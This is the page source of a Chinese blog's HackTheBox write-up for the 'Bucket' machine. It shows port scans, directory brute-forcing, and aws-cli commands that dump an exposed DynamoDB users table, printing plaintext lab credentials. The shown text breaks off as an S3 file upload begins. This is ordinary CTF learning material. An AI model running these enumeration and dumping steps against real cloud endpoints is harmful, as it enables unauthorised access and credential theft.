<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:image:type" content="image/png" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><meta name="keywords" content="Sunset,个人博客,网络安全,渗透测试,CTF,HackTheBox,HackMyVM,技术博客" data-next-head=""/><meta name="author" content="Sunset" data-next-head=""/><link rel="icon" href="https://www.sunsetaction.top/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="https://www.sunsetaction.top/images/logo.png" sizes="180x180" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="/images/logo.png" data-next-head=""/><meta name="theme-color" content="#b91c1c" data-next-head=""/><link rel="preload" href="/fonts/LXGWWenKai-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><link rel="preload" href="/fonts/IBMPlexMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><title data-next-head="">HackTheBox - Machine - Bucket | Sunset Blog</title><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Machine Bucket https://app.hackthebox.com/machines/Bucket | Linux | Medium Recon 端口扫描 访问 HTTP 主页上没有一点信息，对目录进行爆破 但是我注意到源代码中的图片是通过子域名http://s3.bucket.ht..." data-next-head=""/><meta property="og:title" content="HackTheBox - Machine - Bucket | Sunset Blog" data-next-head=""/><meta property="og:description" content="Machine Bucket https://app.hackthebox.com/machines/Bucket | Linux | Medium Recon 端口扫描 访问 HTTP 主页上没有一点信息，对目录进行爆破 但是我注意到源代码中的图片是通过子域名http://s3.bucket.ht..." data-next-head=""/><meta property="og:url" content="https://www.sunsetaction.top/2025/06/06/HackTheBoxMachine - Bucket" data-next-head=""/><meta property="og:type" content="article" data-next-head=""/><meta property="article:published_time" content="2025-06-06" data-next-head=""/><meta property="article:modified_time" content="2025-06-06" data-next-head=""/><meta property="article:author" content="Sunset" data-next-head=""/><meta property="article:section" content="靶机" data-next-head=""/><meta property="article:tag" content="HackTheBox" data-next-head=""/><meta property="article:tag" content="Linux" data-next-head=""/><meta property="article:tag" content="AWS_S3" data-next-head=""/><meta property="article:tag" content="Dynamodb" data-next-head=""/><meta property="article:tag" content="PD4ML" data-next-head=""/><meta property="og:image" content="https://www.sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="HackTheBox - Machine - Bucket" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><link rel="canonical" href="https://www.sunsetaction.top/2025/06/06/HackTheBoxMachine - Bucket" data-next-head=""/><link rel="preload" href="/_next/static/css/ef713f45b0b41153.css" as="style"/><link rel="preload" href="/_next/static/css/f055e431c58b907b.css" as="style"/><script type="application/ld+json" data-next-head="">{"@context":"https://schema.org","@type":"BlogPosting","datePublished":"2025-06-06","description":"Machine Bucket https://app.hackthebox.com/machines/Bucket | Linux | Medium Recon 端口扫描 访问 HTTP 主页上没有一点信息，对目录进行爆破 但是我注意到源代码中的图片是通过子域名http://s3.bucket.ht...","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.sunsetaction.top/2025/06/06/HackTheBoxMachine - Bucket"},"headline":"HackTheBox - Machine - Bucket","image":["https://www.sunsetaction.top/images/logo.png"],"dateModified":"2025-06-06","author":{"@type":"Person","name":"Sunset"},"publisher":{"@type":"Organization","name":"Sunset Blog","logo":{"@type":"ImageObject","url":"https://www.sunsetaction.top/images/logo.png"}}}</script><script>
              (function() {
                try {
                  // 读取用户保存的主题偏好
                  const savedTheme = localStorage.getItem('theme');
                  
                  // 检测系统主题偏好
                  const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
                  
                  // 判断是否应该使用暗黑模式
                  const shouldUseDark = savedTheme === 'dark' || (!savedTheme && systemPrefersDark);
                  
                  // 立即应用暗黑模式（在页面渲染前）
                  if (shouldUseDark) {
                    document.documentElement.classList.add('dark');
                  }
                } catch (e) {
                  // 静默处理错误，避免阻塞页面加载
                  console.error('Theme initialization error:', e);
                }
              })();
            </script><link rel="stylesheet" href="/_next/static/css/ef713f45b0b41153.css" data-n-g=""/><link rel="stylesheet" href="/_next/static/css/f055e431c58b907b.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-d2c05f55b5519780.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-f21970b4881df644.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/796-34c17833b03faf26.js" defer=""></script><script src="/_next/static/chunks/pages/%5Byear%5D/%5Bmonth%5D/%5Bday%5D/%5Bid%5D-4c7ff0ae52612d94.js" defer=""></script><script src="/_next/static/rYHkFZPcHeH30wRPpLsoD/_buildManifest.js" defer=""></script><script src="/_next/static/rYHkFZPcHeH30wRPpLsoD/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="w-full bg-[#fafafa] dark:bg-[#1f2022]" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><div class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</div></div><div class="mt-2 grid grid-cols-5"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/tags/">Tags</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full relative"><div class="flex justify-center"><article class="w-full md:w-3/4 lg:w-2/3 xl:w-4xl px-3 mt-5 md:mt-15 max-w-[800px]" style="opacity:0;transform:translateY(20px)"><h1 class="text-xl md:text-2xl font-bold text-red-700 dark:text-red-400" style="opacity:0;transform:translateX(-20px)">HackTheBox - Machine - Bucket</h1><div class="flex flex-col" style="opacity:0"><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">SUNSET</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">2025-06-06</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">(Updated:<!-- -->2025-06-06<!-- -->)</p></div><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Category:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">靶机</span></div><div class="flex flex-wrap text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Tags:</p><a href="/tag/HackTheBox/"><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300 cursor-pointer hover:bg-red-700 hover:text-white transition-colors">HackTheBox</span></a><a href="/tag/Linux/"><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300 cursor-pointer hover:bg-red-700 hover:text-white transition-colors">Linux</span></a><a href="/tag/AWS_S3/"><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300 cursor-pointer hover:bg-red-700 hover:text-white transition-colors">AWS_S3</span></a><a href="/tag/Dynamodb/"><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300 cursor-pointer hover:bg-red-700 hover:text-white transition-colors">Dynamodb</span></a><a href="/tag/PD4ML/"><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300 cursor-pointer hover:bg-red-700 hover:text-white transition-colors">PD4ML</span></a></div></div><div style="opacity:0;transform:translateY(10px)"><div class="my-8 text-center"><div class="flex flex-col items-center gap-3"><div class="w-8 h-8 border-4 border-red-700 dark:border-red-400 border-t-transparent rounded-full animate-spin"></div><p class="text-gray-500 dark:text-gray-400 text-sm">加载中...</p></div></div></div></article></div></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><div class="flex justify-center items-center gap-2 mb-4 text-sm text-gray-600 dark:text-gray-400"><a class="inline-flex items-center gap-1 hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 RSS Feed" href="/rss.xml"><svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20C5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1Z"></path></svg>RSS</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 Atom Feed" href="/atom.xml">Atom</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 JSON Feed" href="/feed.json">JSON</a></div><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackTheBoxMachine - Bucket","contentHtml":"\u003ch1\u003eMachine - Bucket\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://app.hackthebox.com/machines/Bucket\"\u003ehttps://app.hackthebox.com/machines/Bucket\u003c/a\u003e | \u003ccode\u003eLinux\u003c/code\u003e | \u003ccode\u003eMedium\u003c/code\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eRecon\u003c/h2\u003e\n\u003cp\u003e端口扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Bucket nmap -sT -min-rate 5000 10.10.10.212\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 09:27 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e bucket.htb (10.10.10.212)\nHost is up (0.086s latency).\nNot shown: 998 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 0.51 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Bucket nmap -sT -A -p 22,80 10.10.10.212                             \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 09:28 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e bucket.htb (10.10.10.212)\nHost is up (0.12s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)\n|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)\n|_  256 18:\u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)\n80/tcp open  http    Apache httpd 2.4.41\n|_http-title: Site doesn\u003cspan class=\"hljs-string\"\u003e't have a title (text/html).\n|_http-server-header: Apache/2.4.41 (Ubuntu)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nNetwork Distance: 2 hops\nService Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   108.02 ms 10.10.16.1\n2   54.68 ms  bucket.htb (10.10.10.212)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 16.14 seconds\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问 \u003ccode\u003eHTTP\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e主页上没有一点信息，对目录进行爆破\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Bucket feroxbuster --url http://bucket.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404,403 -x php,zip,txt \n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben \u003cspan class=\"hljs-string\"\u003e\"epi\"\u003c/span\u003e Risher 🤓                 ver: 2.11.0\n───────────────────────────┬──────────────────────\n 🎯  Target Url            │ http://bucket.htb/\n 🚀  Threads               │ 50\n 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n 💢  Status Code Filters   │ [404, 403]\n 💥  Timeout (secs)        │ 7\n 🦡  User-Agent            │ feroxbuster/2.11.0\n 💉  Config File           │ /etc/feroxbuster/ferox-config.toml\n 🔎  Extract Links         │ \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n 💲  Extensions            │ [php, zip, txt]\n 🏁  HTTP methods          │ [GET]\n 🔃  Recursion Depth       │ 4\n───────────────────────────┴──────────────────────\n 🏁  Press [ENTER] to use the Scan Management Menu™\n──────────────────────────────────────────────────\n404      GET        9l       31w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n[#\u003e------------------] - 88s    46359/882180  23m     found:0       errors:37     \n🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_bucket_htb_-1749173567.state ...\n[#\u003e------------------] - 88s    46399/882180  23m     found:0       errors:37     \n[#\u003e------------------] - 88s    46400/882180  527/s   http://bucket.htb/         \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是我注意到源代码中的图片是通过子域名\u003ccode\u003ehttp://s3.bucket.htb\u003c/code\u003e 中获取的\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e将其添加到 \u003ccode\u003ehosts\u003c/code\u003e，并访问，只显示 \u003ccode\u003erunning\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e网上搜索 \u003ccode\u003es3\u003c/code\u003e 大部分都是 \u003ccode\u003eAWS S3\u003c/code\u003e ，所以假定这是一个 \u003ccode\u003eAWS S3\u003c/code\u003e 实例\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e跑一下目录扫描，能找到两个子目录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜Bucket gobuster \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,zip -u http://s3.bucket.htb\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) \u0026#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://s3.bucket.htb\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e directory enumeration mode\n===============================================================\n/health               (Status: 200) [Size: 54]\n/shell                (Status: 200) [Size: 0]\n/server-status        (Status: 403)\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eAWS S3\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e关于AWS S3 \u003ca href=\"https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/Welcome.html\"\u003ehttps://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/Welcome.html\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e根据手册，\u003ccode\u003eadserver\u003c/code\u003e是一个存储桶，\u003ccode\u003eimages/bug.jpg\u003c/code\u003e 是对象键，\u003ccode\u003ehttp://s3.bucket.htb\u003c/code\u003e 是端点\u003c/p\u003e\n\u003cp\u003e访问 \u003ccode\u003e/shell\u003c/code\u003e 会被重定向到一个奇怪的\u003ccode\u003eURL\u003c/code\u003e，看起来只像是只有内网可以访问\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e访问 \u003ccode\u003e/health\u003c/code\u003e 发现除了 s3 还运行着 \u003ccode\u003edynamodb\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e关于 Dynamodb \u003ca href=\"https://docs.amazonaws.cn/amazondynamodb/latest/developerguide/Introduction.html\"\u003ehttps://docs.amazonaws.cn/amazondynamodb/latest/developerguide/Introduction.html\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e从文档上看，Dynamodb 和 S3 都可以使用 Amazon CLI 来访问，并且两个应用都是可以集成的\u003c/p\u003e\n\u003ch3\u003eDynamodb\u003c/h3\u003e\n\u003cp\u003e访问\u003ccode\u003eDynamodb\u003c/code\u003e前，要先配置  \u003ccode\u003eaws-cli\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003ePS：官方配置需要 Access ID，并且注册需要信用卡，以为差点无了，看了下WP才知道可以瞎填\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Bucket aws configure           \nAWS Access Key ID [None]: sunsetaction\nAWS Secret Access Key [None]: sunsetaction\nDefault region name [None]: CN\nDefault output format [None]: json\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e列出所有表\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Bucket aws dynamodb list-tables --endpoint-url http://s3.bucket.htb\n{\n    \u003cspan class=\"hljs-string\"\u003e\"TableNames\"\u003c/span\u003e: [\n        \u003cspan class=\"hljs-string\"\u003e\"users\"\u003c/span\u003e\n    ]\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查询表的数据，可以得到几个用户凭据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Bucket aws dynamodb scan --endpoint-url http://s3.bucket.htb --table-name \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\n{\n    \u003cspan class=\"hljs-string\"\u003e\"Items\"\u003c/span\u003e: [\n        {\n            \u003cspan class=\"hljs-string\"\u003e\"password\"\u003c/span\u003e: {\n                \u003cspan class=\"hljs-string\"\u003e\"S\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"Management@#1@#\"\u003c/span\u003e\n            },\n            \u003cspan class=\"hljs-string\"\u003e\"username\"\u003c/span\u003e: {\n                \u003cspan class=\"hljs-string\"\u003e\"S\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"Mgmt\"\u003c/span\u003e\n            }\n        },\n        {\n            \u003cspan class=\"hljs-string\"\u003e\"password\"\u003c/span\u003e: {\n                \u003cspan class=\"hljs-string\"\u003e\"S\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"Welcome123!\"\u003c/span\u003e\n            },\n            \u003cspan class=\"hljs-string\"\u003e\"username\"\u003c/span\u003e: {\n                \u003cspan class=\"hljs-string\"\u003e\"S\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"Cloudadm\"\u003c/span\u003e\n            }\n        },\n        {\n            \u003cspan class=\"hljs-string\"\u003e\"password\"\u003c/span\u003e: {\n                \u003cspan class=\"hljs-string\"\u003e\"S\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"n2vM-\u0026#x3C;_K_Q:.Aa2\"\u003c/span\u003e\n            },\n            \u003cspan class=\"hljs-string\"\u003e\"username\"\u003c/span\u003e: {\n                \u003cspan class=\"hljs-string\"\u003e\"S\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"Sysadm\"\u003c/span\u003e\n            }\n        }\n    ],\n    \u003cspan class=\"hljs-string\"\u003e\"Count\"\u003c/span\u003e: 3,\n    \u003cspan class=\"hljs-string\"\u003e\"ScannedCount\"\u003c/span\u003e: 3,\n    \u003cspan class=\"hljs-string\"\u003e\"ConsumedCapacity\"\u003c/span\u003e: null\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将其拿去对\u003ccode\u003essh\u003c/code\u003e进行碰撞，但是无结果，貌似也能对数据进行写入，但是现在也没用\u003c/p\u003e\n\u003ch3\u003e文件上传\u003c/h3\u003e\n\u003cp\u003e我们通过文档 \u003ca href=\"https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/list-buckets.html\"\u003ehttps://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/list-buckets.html\u003c/a\u003e 可以知道存在 \u003ccode\u003eaws s3 ls\u003c/code\u003e 命令，该命令作用是将在单个非分页调用中列出您账户中的所有通用存储桶。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Bucket aws --endpoint-url http://s3.bucket.htb s3 \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\n2025-06-06 15:06:03 adserver\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e命令结果是我们和\u003ccode\u003eimages\u003c/code\u003e 在同一目录下\u003c/p\u003e\n\u003cp\u003e我们查看帮助还能看到 \u003ccode\u003ecp\u003c/code\u003e 命令，那么代表可能可以对文件进行上传\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们上传一个文件测试一下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Bucket \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan 